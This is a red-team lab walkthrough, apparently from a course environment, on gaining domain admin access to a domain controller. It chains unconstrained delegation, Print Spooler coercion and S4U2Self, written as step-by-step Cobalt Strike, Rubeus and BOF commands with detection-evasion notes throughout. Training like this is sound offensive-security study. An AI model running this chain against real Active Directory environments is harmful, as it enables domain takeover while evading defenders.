# S4U2Self Lab  

>The objective for this lab is to demonstrate how to abuse S4U2self with the TGT for a computer account.

**Concept:** S4U2Self allows a service to request a service ticket to *itself* on behalf of any user — no user TGT or password needed. Combined with unconstrained delegation and a coercion trigger `SpoolSample`, you capture the DC machine account TGT, then use `krb_s4u /self` to generate a usable `cifs` service ticket impersonating a Domain Admin. The DC machine account TGT alone cannot be used for file access — S4U2Self bridges that gap.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Find computers configured with unconstrained delegation (excludes DCs — not a viable attack path):

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
    ```

    > OPSEC-🟢SAFE — BOF, runs in beacon thread, no child process.

⚠️ Expected result: `lon-ws-1$` — the unconstrained delegation host you will pivot through.

3. Impersonate the *rsteel* user and move laterally to `lon-ws-1`.

===

## Lateral Movement to lon-ws-1

Goal: get a beacon on `lon-ws-1` running as local admin (`rsteel`). SYSTEM is **not** required for this lab — you are capturing the DC's TGT via Rubeus monitor and coercion, not dumping the local machine account TGT via LUID `0x3e7`.

1. On the existing beacon, open the process browser and find a process owned by `rsteel` (or any domain user with local admin on `lon-ws-1`):

    ```Beacon-nocolor
    process_browser
    ```

2. Steal the token of that process:

    ```Beacon-nocolor
    steal_token <pid>
    ```

    > OPSEC-🟢SAFE — token impersonation in beacon thread, no process spawn.

3. Set spawnto before jumping to avoid default `rundll32.exe` child process.
   `ak-settings` is the Aggressor Kit command loaded in the CRTO lab environment:

    ```Beacon-nocolor
    ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    ```

    Equivalent standard CS command (if Aggressor Kit is not loaded):

    ```Beacon-nocolor
    spawnto x64 %windir%\sysnative\dllhost.exe
    ```

    > OPSEC-🟠CAUTION — sets the sacrificial process for any subsequent fork & run commands. `dllhost.exe` blends with normal COM surrogate activity.

4. Move laterally to `lon-ws-1` — prefer WinRM, fall back to scshell if WinRM is blocked:

    ```Beacon-nocolor
    # OPSEC-SAFE (preferred) — WinRM, no service modification, no disk write on target
    
    jump winrm64 lon-ws-1 smb

    # OPSEC-CAUTION (fallback) — SCShell modifies existing service ImagePath via SCM
    # Generates: Event 7040 (service config changed), 4697, 4688
    
    jump scshell64 lon-ws-1 smb
    ```

5. Interact with the **new** beacon on `LON-WS-1`. Verify running as SYSTEM:

    ```Beacon-nocolor
    getuid
    ```

===

## Exploitation

### Step 1 — Start Rubeus monitor on lon-ws-1

Monitors for incoming TGTs via SSPI as they arrive — no LSASS memory read.

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```

> OPSEC-🟠CAUTION — fork & run into `dllhost.exe` (spawnto set above). Ticket capture itself uses Windows SSPI/Kerberos API — no direct LSASS read. `/targetuser` filters output to the DC machine account only, reducing noise.

---

### Step 2 — Coerce lon-dc-1 to authenticate to lon-ws-1

Triggers the Print Spooler service on `lon-dc-1` via MS-RPRN to send its TGT to `lon-ws-1`.

```Beacon-nocolor
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```

> OPSEC-🟠CAUTION — fork & run. Generates a 4648 logon event on `lon-dc-1` and MS-RPRN RPC traffic. Print Spooler must be running on the DC.

⚠️ Rubeus monitor output should capture the TGT of `lon-dc-1$`. Copy the full base64 ticket string — paste it **directly into the `krb_s4u` command** below. No file write needed at this stage.

---

### Step 3 — S4U2Self to obtain a usable cifs service ticket

The DC machine account TGT cannot be used directly for file access. Use `krb_s4u /self` to convert it into a `cifs` service ticket impersonating Administrator.

```Beacon-nocolor
krb_s4u /ticket:[paste-base64-DC-TGT-here] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.

⚠️ `krb_s4u` outputs a **new** base64-encoded service ticket (this is a different ticket to the DC TGT). Copy this new base64 string — this one gets written to the `.kirbi` file in Step 4.

```
Rubeus monitor output  →  base64 DC TGT       →  paste into krb_s4u
krb_s4u output         →  base64 cifs ticket  →  WriteAllBytes → .kirbi → kerberos_ticket_use
```

---

### Step 4 — Save the service ticket on the attacker machine

Run this on the attacker CS client (local PowerShell — **not** via beacon):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
```

> The `.kirbi` file is written to your **attacker desktop only** — nothing touches the target's disk. `kerberos_ticket_use` reads from the CS client and injects over the C2 channel.

---

### Step 5 — Inject the ticket and access the share

Back in the beacon on **`lon-ws-1`** (not lon-dc-1 — you are accessing it remotely via the ticket):

```Beacon-nocolor
make_token CONTOSO\Administrator FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ls \\lon-dc-1\c$
```

> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in-memory. `kerberos_ticket_use` injects the ticket into it — no disk write on target, no child process.

⚠️ `ls \\lon-dc-1\c$` should succeed. If it fails with `ACCESS_DENIED`, verify:
- `getuid` — confirm token is set
- `run klist` — confirm the `cifs/lon-dc-1` ticket is present in the session (note: `run klist` spawns a child process — acceptable for quick verification only)
- The SPN in `krb_s4u` exactly matches `cifs/lon-dc-1`

Drop impersonation when done:

```Beacon-nocolor
rev2self
```

===

⚠️ In this lab, you have learned how to combine unconstrained delegation, remote authentication triggers, and S4U2Self to compromise domain controller `lon-dc-1` — converting an unusable DC machine account TGT into a valid `cifs` service ticket without touching LSASS directly.
